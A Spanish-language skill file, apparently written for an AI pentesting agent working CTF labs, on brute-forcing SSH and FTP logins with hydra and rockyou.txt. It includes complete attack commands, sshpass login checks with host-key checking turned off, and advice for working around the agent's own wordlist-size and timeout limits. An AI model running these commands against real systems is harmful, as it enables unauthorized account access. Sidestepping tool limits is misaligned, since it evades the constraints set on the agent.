---
name: bruteforce-hydra
description: Crackea una credencial con hydra cuando la tool de credenciales rechaza una wordlist grande (rockyou.txt) o se queda sin presupuesto.
---

# Fuerza bruta con hydra

Receta para cuando hay un servicio con login (SSH, FTP) y una wordlist grande.
Medida en Simple CTF: `nexus.cred.bruteforce` falló con
`wordlist exceeds 16 MB` al pasarle `rockyou.txt` (133 MB), y copiar el fichero
al workspace falló igual porque el límite es del **handler**, no de la ruta. El
run consumió sus iteraciones reintentando antes de poder lanzar hydra a mano.

## 1. Cuándo usar esta receta

Usa `nexus.shell.exec` con hydra directamente si se cumple cualquiera de estas:

- `nexus.cred.bruteforce` devuelve `wordlist exceeds 16 MB` (rockyou.txt,
  `darkc0de.lst`, cualquier lista de sistema);
- la wordlist es grande pero < 16 MB y el handler solo prueba
  `max_attempts` (200 por defecto, 5000 como máximo), así que se queda corto;
- el handler se queda sin tiempo (900 s) a mitad de la lista;
- necesitas variantes que el handler no expone: `-L` (varios usuarios), `-e nsr`
  (usuario=contraseña, vacía, inversa), `-x` (máscara).

No lo uses para probar 3 credenciales sueltas: ahí `nexus.cred.bruteforce` es más
barato y deja la contraseña en la bóveda (`secret_ref`) sin exponerla.

## 2. Prepara la entrada

`nexus.shell.exec` corre en el Kali del operador, así que **las wordlists del
sistema están disponibles sin copiarlas**:

```bash
ls -lh /usr/share/wordlists/rockyou.txt
```

Si el objetivo tiene un usuario (lo viste en el FTP anónimo, en un `task.txt` o
en un banner), empieza con `-l <user>`. Si solo tienes nombres, crea la lista:

```bash
printf '%s\n' mitch lin > users.txt
```

No metas `rockyou.txt` en el workspace: 133 MB no aportan nada y el engagement
se llena de basura.

## 3. Lanza hydra

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target> -s <port>
```

Notas del comando:

- `<port>` es el puerto real del servicio: si SSH no está en el 22 (Simple CTF
  lo tenía en otro puerto), sin `-s` hydra ataca el 22 y no encuentra nada;
- si hydra rechaza opciones después del target, ponlas delante:
  `hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<target>`;
- hydra ya viene instalado en Kali y corre nativo (sin contenedor), por eso es
  más rápido que el handler;
- añade `-t 4` para no tumbar el servicio (`-t 16` dispara rate limits y
  desconexiones que se leen como "no encontrado");
- añade `-f` para parar en el primer acierto y `-I` para ignorar ficheros de
  restore de intentos anteriores;
- guarda la salida en un fichero para no depender del resumen de 60 líneas:
  `| tee hydra.txt`.

Ejemplo completo para SSH en el puerto 2222:

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 -t 4 -f -I ssh://<target> | tee hydra.txt
```

Para FTP:

```bash
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt -s 21 -t 4 -f -I ftp://<target> | tee hydra.txt
```

## 4. Comprueba el acierto

Hydra imprime la línea del hallazgo:

```
[2222][ssh] host: 10.10.10.5   login: mitch   password: secret
```

y **devuelve exit 0 aunque no encuentre nada**, así que no te fíes del código de
salida. Verifica con un login real, no repitiendo el ataque:

```bash
grep -i "password:" hydra.txt
sshpass -p '<password>' ssh -o StrictHostKeyChecking=no \
  -o PreferredAuthentications=password -p <port> <user>@<target> id
```

Si no tienes `sshpass`, usa `nexus.post.ssh_exec` con usuario/contraseña cuando
exista, o `python3 -c` con `paramiko`. Un `Permission denied` significa que la
credencial no vale: vuelve al paso 3 con otra lista, no con el mismo comando.

## 5. Registra y sigue la cadena

Con acceso confirmado:

- registra el hecho con `nexus.knowledge.record_fact` (`fact_type: "credential"`,
  `key: "<user>@<target>"`, `value: {"username": ..., "service": "ssh", "port": ...}`)
  **sin la contraseña en claro** en el prompt ni en el resumen;
- anota en `value.secret_ref` la referencia de la bóveda si la credencial salió
  de `nexus.cred.bruteforce`;
- sigue con `nexus.post.ssh_exec`/`ssh_upload` para `user.txt` y la escalada.

## 6. Errores comunes

- **`wordlist exceeds 16 MB`**: es el límite de `nexus.cred.bruteforce`; no lo
  arregles copiando el fichero al workspace. Cambia a `nexus.shell.exec`.
- **Hydra acaba en segundos sin hit**: puerto equivocado (falta `-s`), servicio
  equivocado (`ssh://` contra un FTP) o el usuario no existe. Confirma el banner
  con `nmap -sV -p<port>` antes de repetir.
- **`[ERROR] target ssh://... does not support password authentication`**: el
  servidor solo acepta clave pública; la fuerza bruta no es el vector.
- **Muchos `Connection reset`**: baja `-t` a 2-4 y añade `-W 3`.
- **Timeout de `nexus.shell.exec`** (900 s máximo): no relances rockyou entero.
  Parte la lista y continúa donde se quedó:
  `sed -n '20001,40000p' rockyou.txt > chunk.txt` y usa `-P chunk.txt`.
- **No repitas el mismo par usuario/lista**: si hydra ya lo barrió y no hay hit,
  cambia de usuario (`-L users.txt`), de servicio o de vector.
